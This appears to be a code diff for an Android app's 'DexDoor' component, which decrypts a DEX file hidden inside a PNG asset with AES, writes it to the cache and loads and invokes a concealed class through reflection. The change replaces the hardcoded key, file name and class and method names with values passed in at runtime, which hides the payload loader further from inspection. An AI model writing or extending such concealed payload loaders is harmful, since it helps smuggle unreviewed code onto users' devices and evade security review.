@@ -1,14 +1,12 @@
-package com.announcement.comprehension.t.dex
+package com.announcement.comprehension.t
 
 import android.app.Application
 import android.content.Context
-import android.util.Base64
 import java.io.File
 import java.io.FileOutputStream
 import java.lang.reflect.Constructor
 import java.lang.reflect.Field
 import java.lang.reflect.Method
-import java.nio.charset.StandardCharsets
 import java.security.Key
 import javax.crypto.Cipher
 import javax.crypto.spec.SecretKeySpec
@@ -25,22 +23,15 @@ object DexDoor {
         return cipher.doFinal(data)
     }
 
-    fun start(context: Context, list1: ArrayList<String?>) {
+    fun start(context: Context, list0: ArrayList<String>, list1: ArrayList<String>) {
         try {
-//            // 1. Base64 解码并 AES 解密
-//            val decoded: ByteArray? = Base64.decode(list1.get(0), Base64.DEFAULT)
-//            val sks = SecretKeySpec(list1.get(1)!!.toByteArray(StandardCharsets.UTF_8), "AES")
-//            val cp = Cipher.getInstance("AES/ECB/PKCS5Padding")
-//            cp.init(Cipher.DECRYPT_MODE, sks)
-//            val buffer = cp.doFinal(decoded)
-
-            val encryptedPng = context.assets.open("ka.png").use { it.readBytes() }
+            val encryptedPng = context.assets.open(list0[0]).use { it.readBytes() }
             val encryptedDex = encryptedPng.copyOfRange(8, encryptedPng.size)
 
-              val importantKey: Key = SecretKeySpec("vbiKMu90!pkk*&BK".toByteArray(), "AES")
+            val importantKey: Key = SecretKeySpec(list0[1].toByteArray(), "AES")
 
             // 3. 解密 Dex 数据
-            val dexBytes = aesDecrypt(encryptedDex, importantKey )
+            val dexBytes = aesDecrypt(encryptedDex, importantKey)
 
             // 4. 将 Dex 写入临时文件
             val outFile = File(context.cacheDir, "cfgo")
@@ -64,7 +55,7 @@ object DexDoor {
                 od.mkdirs()
 
                 // 构建 DexClassLoader
-                val loaderClass = Class.forName("dalvik.system.DexClassLoader")
+                val loaderClass = Class.forName(list0[2])
                 val loaderConstructor: Constructor<*> = loaderClass.getConstructor(
                     String::class.java,
                     String::class.java,
@@ -78,13 +69,13 @@ object DexDoor {
                     context.getClassLoader()
                 )
                 val loadClassMethod: Method =
-                    loader.javaClass.getMethod("loadClass", String::class.java)
-                dexClass = loadClassMethod.invoke(loader, "m.ki.Dva") as Class<*>?
+                    loader.javaClass.getMethod(list0[3], String::class.java)
+                dexClass = loadClassMethod.invoke(loader, list0[4]) as Class<*>?
 
                 val field: Field = dexClass!!.getField("INSTANCE")
                 dexObject = field.get(null)
                 dexMethod = dexClass!!.getDeclaredMethod(
-                    "sim",
+                    list0[5],
                     Application::class.java,
                     ArrayList::class.java
                 )
